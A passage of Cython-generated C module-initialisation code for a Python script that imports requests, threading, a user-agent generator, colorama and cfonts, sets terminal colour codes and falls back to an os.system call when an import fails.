  __pyx_t_2 = __Pyx_Import(__pyx_n_s_json, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_json, __pyx_t_2) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_Table);
  __Pyx_GIVEREF(__pyx_n_s_Table);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_Table);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_rich_table, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_Table); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Table, __pyx_t_2) < 0) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_Console);
  __Pyx_GIVEREF(__pyx_n_s_Console);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_Console);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_rich_console, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_Console); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Console, __pyx_t_1) < 0) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_sys, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_2) < 0) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_get);
  __Pyx_GIVEREF(__pyx_n_s_get);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_get);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_get); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_get, __pyx_t_2) < 0) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_uuid, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_uuid, __pyx_t_1) < 0) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_hashlib, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_hashlib, __pyx_t_1) < 0) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_re, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_re, __pyx_t_1) < 0) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_randrange);
  __Pyx_GIVEREF(__pyx_n_s_randrange);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_randrange);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_random, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_randrange); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_rr, __pyx_t_1) < 0) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_choice);
  __Pyx_GIVEREF(__pyx_n_s_choice);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_choice);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_random, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cc, __pyx_t_2) < 0) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_generate_user_agent);
  __Pyx_GIVEREF(__pyx_n_s_generate_user_agent);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_generate_user_agent);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_user_agent_2, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ggb, __pyx_t_1) < 0) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_post);
  __Pyx_GIVEREF(__pyx_n_s_post);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_post);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_post); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_pp, __pyx_t_2) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s__80);
  __Pyx_GIVEREF(__pyx_n_s__80);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s__80);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_user_agent_2, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__pyx_import_star(__pyx_t_2) < 0) __PYX_ERR(0, 20, __pyx_L1_error);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_Thread);
  __Pyx_GIVEREF(__pyx_n_s_Thread);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_Thread);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_threading, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_Thread); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Thread, __pyx_t_2) < 0) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_random, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_random, __pyx_t_1) < 0) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_time, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_1) < 0) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_1) < 0) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_Style);
  __Pyx_GIVEREF(__pyx_n_s_Style);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_Style);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_colorama, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_Style); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Style, __pyx_t_1) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_datetime);
  __Pyx_GIVEREF(__pyx_n_s_datetime);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_datetime);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_datetime, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_datetime); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_datetime, __pyx_t_2) < 0) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Style); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_BRIGHT); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BOLD, __pyx_t_2) < 0) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_Style); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_RESET_ALL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_RESET, __pyx_t_1) < 0) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_RESET, __pyx_kp_u_0m) < 0) __PYX_ERR(0, 31, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_YELLOW, __pyx_kp_u_1m_33m) < 0) __PYX_ERR(0, 32, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_GREEN, __pyx_kp_u_1m_32m) < 0) __PYX_ERR(0, 33, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_RED, __pyx_kp_u_1m_31m) < 0) __PYX_ERR(0, 34, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_CYAN, __pyx_kp_u_1m_36m) < 0) __PYX_ERR(0, 35, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_WHITE, __pyx_kp_u_1m_37m) < 0) __PYX_ERR(0, 36, __pyx_L1_error)

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_4, &__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
    /*try:*/ {

      
      __pyx_t_1 = PyList_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 38, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_INCREF(__pyx_n_s_Fore);
      __Pyx_GIVEREF(__pyx_n_s_Fore);
      PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_Fore);
      __Pyx_INCREF(__pyx_n_s_Style);
      __Pyx_GIVEREF(__pyx_n_s_Style);
      PyList_SET_ITEM(__pyx_t_1, 1, __pyx_n_s_Style);
      __Pyx_INCREF(__pyx_n_s_init);
      __Pyx_GIVEREF(__pyx_n_s_init);
      PyList_SET_ITEM(__pyx_t_1, 2, __pyx_n_s_init);
      __pyx_t_2 = __Pyx_Import(__pyx_n_s_colorama, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 38, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_Fore); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 38, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_1);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_Fore, __pyx_t_1) < 0) __PYX_ERR(0, 38, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_Style); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 38, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_1);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_Style, __pyx_t_1) < 0) __PYX_ERR(0, 38, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_init); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 38, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_1);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_init, __pyx_t_1) < 0) __PYX_ERR(0, 38, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L7_try_end;
    __pyx_L2_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_6) {
      __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_1, &__pyx_t_7) < 0) __PYX_ERR(0, 39, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_7);

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 40, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 40, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__81, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 40, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __pyx_t_8 = PyList_New(3); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 41, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_INCREF(__pyx_n_s_Fore);
      __Pyx_GIVEREF(__pyx_n_s_Fore);
      PyList_SET_ITEM(__pyx_t_8, 0, __pyx_n_s_Fore);
      __Pyx_INCREF(__pyx_n_s_Style);
      __Pyx_GIVEREF(__pyx_n_s_Style);
      PyList_SET_ITEM(__pyx_t_8, 1, __pyx_n_s_Style);
      __Pyx_INCREF(__pyx_n_s_init);
      __Pyx_GIVEREF(__pyx_n_s_init);
      PyList_SET_ITEM(__pyx_t_8, 2, __pyx_n_s_init);
      __pyx_t_9 = __Pyx_Import(__pyx_n_s_colorama, __pyx_t_8, 0); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 41, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_ImportFrom(__pyx_t_9, __pyx_n_s_Fore); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 41, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_Fore, __pyx_t_8) < 0) __PYX_ERR(0, 41, __pyx_L4_except_error)
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_ImportFrom(__pyx_t_9, __pyx_n_s_Style); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 41, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_Style, __pyx_t_8) < 0) __PYX_ERR(0, 41, __pyx_L4_except_error)
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_ImportFrom(__pyx_t_9, __pyx_n_s_init); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 41, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_init, __pyx_t_8) < 0) __PYX_ERR(0, 41, __pyx_L4_except_error)
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      goto __pyx_L3_exception_handled;
    }
    goto __pyx_L4_except_error;
    __pyx_L4_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    goto __pyx_L1_error;
    __pyx_L3_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    __pyx_L7_try_end:;
  }

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_4, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __pyx_t_7 = PyList_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 43, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_n_s_render);
      __Pyx_GIVEREF(__pyx_n_s_render);
      PyList_SET_ITEM(__pyx_t_7, 0, __pyx_n_s_render);
      __Pyx_INCREF(__pyx_n_s_say);
      __Pyx_GIVEREF(__pyx_n_s_say);
      PyList_SET_ITEM(__pyx_t_7, 1, __pyx_n_s_say);
      __pyx_t_1 = __Pyx_Import(__pyx_n_s_cfonts, __pyx_t_7, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 43, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_render); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 43, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_render, __pyx_t_7) < 0) __PYX_ERR(0, 43, __pyx_L10_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_say); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 43, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_say, __pyx_t_7) < 0) __PYX_ERR(0, 43, __pyx_L10_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L15_try_end;
    __pyx_L10_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    
    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_6) {
      __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_7, &__pyx_t_2) < 0) __PYX_ERR(0, 44, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_GOTREF(__pyx_t_2);

      
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_os); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 45, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_9);
